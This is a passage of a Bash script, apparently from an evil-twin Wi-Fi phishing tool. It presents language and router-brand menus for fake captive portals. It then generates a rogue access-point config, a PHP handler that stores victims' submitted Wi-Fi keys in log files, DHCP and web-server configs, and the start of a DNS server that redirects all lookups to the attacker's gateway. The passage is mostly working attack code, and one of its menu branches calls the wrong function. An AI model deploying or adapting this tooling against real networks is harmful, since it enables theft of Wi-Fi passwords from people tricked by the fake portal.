			echo -e "      "$red"["$yellow"1"$red"]"$transparent" Web Interface"
			echo -e "      "$red"["$yellow"2"$red"]"$transparent" Bruteforce"
			echo -e "      "$red"["$yellow"3"$red"]"$transparent" \e[1;31mExit"$transparent""
			echo
			echo -n "#? "
			read yn
			case $yn in
			1 ) matartodo; ConnectionRESET; selection; break;;
			2 ) matartodo; Bruteforce2; break;;
			3 ) matartodo; exitmode; break;;
			esac
		done
	fi 
}

function ConnectionRESET {

	if [ "$FLUX_AUTO" = "1" ];then 
		webconf=1
	else 	
		while true; do
			conditional_clear
			top

			infoap
			n=1
			
			echo
			echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_ConnectionRESET"
			echo
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  English     [ENG]  (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  German      [GER]  (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  Russian     [RUS]  (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  Italian     [IT]   (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  Spanish     [ESP]  (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  Portuguese  [POR]  (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  Chinese     [CN]   (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  French      [FR]   (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  Turkish     [TR]   (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Romanian    [RO]   (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Hungarian   [HU]   (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Arabic      [ARA]  (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Greek       [GR]   (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Czech       [CZ]   (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Norwegian   [NO]   (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Bulgarian   [BG]   (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Serbian     [SRB]  (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Polish      [PL]   (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Indonesian  [ID]   (NEUTRA)";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Dutch       [NL]   (NEUTRA)";n=`expr $n + 1`
      		        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Danish      [DAN]  (NEUTRA)";n=`expr $n + 1`
      		        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Hebrew      [HE]   (NEUTRA)";n=`expr $n + 1`
      		        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Thai        [TH]   (NEUTRA)";n=`expr $n + 1`
                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Portuguese - Brazilian (NEUTRA)";n=`expr $n + 1`
                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Belkin      [ENG]";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Netgear     [ENG]";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Huawei      [ENG]";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Verizon     [ENG]";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Netgear     [ESP]";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Arris       [ESP]";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" ULH              ";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" TP-Link     [ENG]";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" TP-Link     [ITA]";n=`expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Ziggo       [NL]";n=` expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" KPN         [NL]";n=` expr $n + 1`
                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Ziggo2016   [NL]";n=` expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" FRITZBOX_DE [DE] ";n=` expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" FRITZBOX_ENG[ENG] ";n=` expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" GENEXIS_DE  [DE] ";n=` expr $n + 1`
                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" FREEBOX_2   [FR]";n=` expr $n + 1`
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent"\e[1;31m $general_back"$transparent""
                        
			echo
			echo -n "#? "
			read webconf
	 
			if [ "$webconf" = "1" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ENG
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ENG
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ENG
				DIALOG_WEB_OK=$DIALOG_WEB_OK_ENG
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ENG
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ENG
				DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_ENG
				DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_ENG
				DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_ENG
				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_ENG
				NEUTRA
				break

			elif [ "$webconf" = "2" ]; then
		        	DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_GER
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_GER
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_GER
				DIALOG_WEB_OK=$DIALOG_WEB_OK_GER
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_GER
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_GER
				DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_GER
				DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_GER
				DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_GER
				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_GER
				NEUTRA
				break

            		elif [ "$webconf" = "3" ]; then
   				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_RUS
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_RUS
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_RUS
				DIALOG_WEB_OK=$DIALOG_WEB_OK_RUS
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_RUS
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_RUS
				DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_RUS
				DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_RUS
				DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_RUS
				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_RUS
				NEUTRA
				break

			elif [ "$webconf" = "4" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_IT
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_IT
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_IT
				DIALOG_WEB_OK=$DIALOG_WEB_OK_IT
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_IT
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_IT
				DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_IT
				DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_IT
				DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_IT
				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_IT
				NEUTRA
				break

			elif [ "$webconf" = "5" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ESP
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ESP
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ESP
				DIALOG_WEB_OK=$DIALOG_WEB_OK_ESP
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ESP
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ESP
				DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_ESP
				DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_ESP
				DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_ESP
				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_ESP
				NEUTRA
				break

			elif [ "$webconf" = "6" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_POR
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_POR
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_POR
				DIALOG_WEB_OK=$DIALOG_WEB_OK_POR
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_POR
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_POR
				DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_POR
				DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_POR
				DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_POR
				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_POR
				NEUTRA
				break

			elif [ "$webconf" = "7" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_CN
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_CN
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_CN
				DIALOG_WEB_OK=$DIALOG_WEB_OK_CN
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_CN
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_CN
				DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_CN
				DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_CN
				DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_CN
				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_CN
				NEUTRA
				break

			elif [ "$webconf" = "8" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_FR
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_FR
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_FR
				DIALOG_WEB_OK=$DIALOG_WEB_OK_FR
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_FR
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_FR
				DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_FR
				DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_FR
				DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_FR
				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_FR
				NEUTRA
				break

			elif [ "$webconf" = "9" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_TR
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_TR
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_TR
				DIALOG_WEB_OK=$DIALOG_WEB_OK_TR
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_TR
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_TR
				DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_TR
				DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_TR
				DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_TR
				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_TR
				NEUTRA
				break

			elif [ "$webconf" = "10" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_RO
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_RO
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_RO
				DIALOG_WEB_OK=$DIALOG_WEB_OK_RO
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_RO
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_RO
				DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_RO
				DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_RO
				DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_RO
				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_RO
				NEUTRA
				break

			elif [ "$webconf" = "11" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_HU
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_HU
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_HU
				DIALOG_WEB_OK=$DIALOG_WEB_OK_HU
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_HU
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_HU
				DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_HU
				DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_HU
				DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_HU
				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_HU
				NEUTRA
				break

			elif [ "$webconf" = "12" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ARA
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ARA
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ARA
				DIALOG_WEB_OK=$DIALOG_WEB_OK_ARA
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ARA
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ARA
				DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_ARA
				DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_ARA
				DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_ARA
				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_ARA
				NEUTRA
				break

      			elif [ "$webconf" = "13" ]; then
        			DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_GR
     			        DIALOG_WEB_INFO=$DIALOG_WEB_INFO_GR
      				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_GR
       				DIALOG_WEB_OK=$DIALOG_WEB_OK_GR
        			DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_GR
        			DIALOG_WEB_BACK=$DIALOG_WEB_BACK_GR
        			DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_GR
        			DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_GR
        			DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_GR
        			DIALOG_WEB_DIR=$DIALOG_WEB_DIR_GR
        			NEUTRA
        			break

			elif [ "$webconf" = "14" ]; then
        			DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_CZ
      				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_CZ
        			DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_CZ
        			DIALOG_WEB_OK=$DIALOG_WEB_OK_CZ
        			DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_CZ
        			DIALOG_WEB_BACK=$DIALOG_WEB_BACK_CZ
       				DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_CZ
       				DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_CZ
        			DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_CZ
        			DIALOG_WEB_DIR=$DIALOG_WEB_DIR_CZ
        			NEUTRA
        			break

			elif [ "$webconf" = "15" ]; then
                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_NO
                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_NO
                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_NO
                                DIALOG_WEB_OK=$DIALOG_WEB_OK_NO
                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_NO
                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_NO
                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_NO
                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_NO
                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_NO
                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_NO
                                NEUTRA
                                break

			elif [ "$webconf" = "16" ]; then
                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_BG
                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_BG
                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_BG
                                DIALOG_WEB_OK=$DIALOG_WEB_OK_BG
                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_BG
                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_BG
                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_BG
                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_BG
                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_BG
                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_BG
                                NEUTRA
                                break
				
              		elif [ "$webconf" = "17" ]; then
                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_SRB
                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_SRB
                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_SRB
                                DIALOG_WEB_OK=$DIALOG_WEB_OK_SRB
                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_SRB
                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_SRB
                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_SRB
                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_SRB
                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_SRB
                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_SRB
                                NEUTRA
                                break

			elif [ "$webconf" = "18" ]; then
                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_PL
                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_PL
                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_PL
                                DIALOG_WEB_OK=$DIALOG_WEB_OK_PL
                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_PL
                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_PL
                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_PL
                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_PL
                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_PL
                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_PL
                                NEUTRA
                                break

			elif [ "$webconf" = "19" ]; then
                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ID
                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ID
                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ID
                                DIALOG_WEB_OK=$DIALOG_WEB_OK_ID
                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ID
                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ID
                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_ID
                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_ID
                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_ID
                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_ID
                                NEUTRA
                                break

			elif [ "$webconf" = "20" ]; then
                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_NL
                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_NL
                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_NL
                                DIALOG_WEB_OK=$DIALOG_WEB_OK_NL
                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_NL
                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_NL
                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_NL
                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_NL
                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_NL
                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_NL
                                NEUTRA
                                break
			
			elif [ "$webconf" = 21 ]; then
                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_DAN
                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_DAN
                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_DAN
                                DIALOG_WEB_OK=$DIALOG_WEB_OK_DAN
                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_DAN
                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_DAN
                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_DAN
                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_DAN
                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_DAN
                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_DAN
                                NEUTRA
                                break

    			elif [ "$webconf" = 22 ]; then
                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_HE
                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_HE
                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_HE
                                DIALOG_WEB_OK=$DIALOG_WEB_OK_HE
                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_HE
                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_HE
                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_HE
                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_HE
                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_HE
                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_HE
                                NEUTRA
                                break

			elif [ "$webconf" = 23 ]; then
                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_TH
                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_TH
                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_TH
                                DIALOG_WEB_OK=$DIALOG_WEB_OK_TH
                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_TH
                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_TH
                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_TH
                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_TH
                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_TH
                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_TH
                                NEUTRA
                                break

            elif [ "$webconf" = 24 ]; then
                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_PT_BR
                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_PT_BR
                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_PT_BR
                                DIALOG_WEB_OK=$DIALOG_WEB_OK_PT_BR
                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_
                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_
                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_
                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_PT_BR
                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_PT_BR
                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_PT_BR
                                NEUTRA
                                break

			elif [ "$webconf" = "25" ]; then
				BELKIN
				break


			elif [ "$webconf" = "26" ]; then
				NETGEAR
				break

			elif [ "$webconf" = "27" ]; then
				HUAWEI
				break

			elif [ "$webconf" = "28" ]; then
				VERIZON
				break

			elif [ "$webconf" = "29" ]; then
				NETGEAR2
				break

			elif [ "$webconf" = "30" ]; then
				ARRIS2
				break

			elif [ "$webconf" = "31" ]; then
				VODAFONE
				break

			elif [ "$webconf" = "32" ]; then
				TPLINK
				break

			elif [ "$webconf" = "33" ]; then
				TPLINK_ITA
				break

			elif [ "$webconf" = "34" ]; then
				ZIGGO_NL
				break

			elif [ "$webconf" = "35" ]; then
				KPN_NL
				break

                        elif [ "$webconf" = "36" ]; then
                                ZIGGO2016_NL
                                break

      		        elif [ "$webconf" = "37" ]; then
				FRITZBOX_DE
				break

		        elif [ "$webconf" = "38" ]; then
				FRITZBOX_ENG
				break

			elif [ "$webconf" = "40" ]; then
				FREEBOX_2
				break

			elif [ "$webconf" = "41" ]; then
				conditional_clear
				webinterface
				break

			fi

	done
fi
	preattack
	attack
}

# Create different settings required for the script
function preattack {

	# Config HostAPD
	echo "interface=$WIFI
driver=nl80211
ssid=ulh-wifi
channel=$Host_CHAN" > $DUMP_PATH/hostapd.conf

	# Creates PHP
	echo "<?php
error_reporting(0);

\$count_my_page = (\"$DUMP_PATH/hit.txt\");
\$hits = file(\$count_my_page);
\$hits[0] ++;
\$fp = fopen(\$count_my_page , \"w\");
fputs(\$fp , \$hits[0]);
fclose(\$fp);

// Receive form Post data and Saving it in variables
\$key1 = @\$_POST['key1'];

// Write the name of text file where data will be store
\$filename = \"$DUMP_PATH/data.txt\";
\$filename2 = \"$DUMP_PATH/status.txt\";
\$intento = \"$DUMP_PATH/intento\";
\$attemptlog = \"$DUMP_PATH/pwattempt.txt\";

// Marge all the variables with text in a single variable.
\$f_data= ''.\$key1.'';

\$pwlog = fopen(\$attemptlog, \"w\");
fwrite(\$pwlog, \$f_data);
fwrite(\$pwlog,\"\n\");
fclose(\$pwlog);

\$file = fopen(\$filename, \"w\");
fwrite(\$file, \$f_data);
fwrite(\$file,\"\n\");
fclose(\$file);

\$archivo = fopen(\$intento, \"w\");
fwrite(\$archivo,\"\n\");
fclose(\$archivo);

while( 1 ) {

	if (file_get_contents( \$intento ) == 1) {
		header(\"Location:error.html\");
		unlink(\$intento);
	    break;
	}

	if (file_get_contents( \$intento ) == 2) {
		header(\"Location:final.html\");
		break;
	}

	sleep(1);
}
?>" > $DUMP_PATH/data/check.php

	# Config DHCP
	echo "authoritative;

default-lease-time 600;
max-lease-time 7200;

subnet $RANG_IP.0 netmask 255.255.255.0 {

option broadcast-address $RANG_IP.255;
option routers $IP;
option subnet-mask 255.255.255.0;
option domain-name-servers $IP;

range $RANG_IP.100 $RANG_IP.250;

}" > $DUMP_PATH/dhcpd.conf

	#create an empty leases file
	touch $DUMP_PATH/dhcpd.leases

	# creates Lighttpd web-server
	echo "server.document-root = \"$DUMP_PATH/data/\"

  server.modules = (
    \"mod_access\",
    \"mod_alias\",
    \"mod_accesslog\",
    \"mod_fastcgi\",
    \"mod_redirect\",
    \"mod_rewrite\"
  )

  fastcgi.server = ( \".php\" => ((
  		  \"bin-path\" => \"/usr/bin/php-cgi\",
  		  \"socket\" => \"/php.socket\"
  		)))

  server.port = 80
  server.pid-file = \"/var/run/lighttpd.pid\"
  # server.username = \"www\"
  # server.groupname = \"www\"

  mimetype.assign = (
  \".html\" => \"text/html\",
  \".htm\" => \"text/html\",
  \".txt\" => \"text/plain\",
  \".jpg\" => \"image/jpeg\",
  \".png\" => \"image/png\",
  \".css\" => \"text/css\"
  )


  server.error-handler-404 = \"/\"

  static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
  index-file.names = ( \"index.htm\", \"index.html\" )

  \$SERVER[\"socket\"] == \":443\" {
  	url.redirect = ( \"^/(.*)\" => \"http://www.internet.com\")
  	ssl.engine                  = \"enable\"
  	ssl.pemfile                 = \"$DUMP_PATH/server.pem\"

  }

  #Redirect www.domain.com to domain.com
  \$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
  	url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
  	ssl.engine                  = \"enable\"
  	ssl.pemfile                 = \"$DUMP_PATH/server.pem\"
  }
  " >$DUMP_PATH/lighttpd.conf


# that redirects all DNS requests to the gateway
	echo "import socket

class DNSQuery:
  def __init__(self, data):
    self.data=data
    self.dominio=''

    tipo = (ord(data[2]) >> 3) & 15
    if tipo == 0:
      ini=12
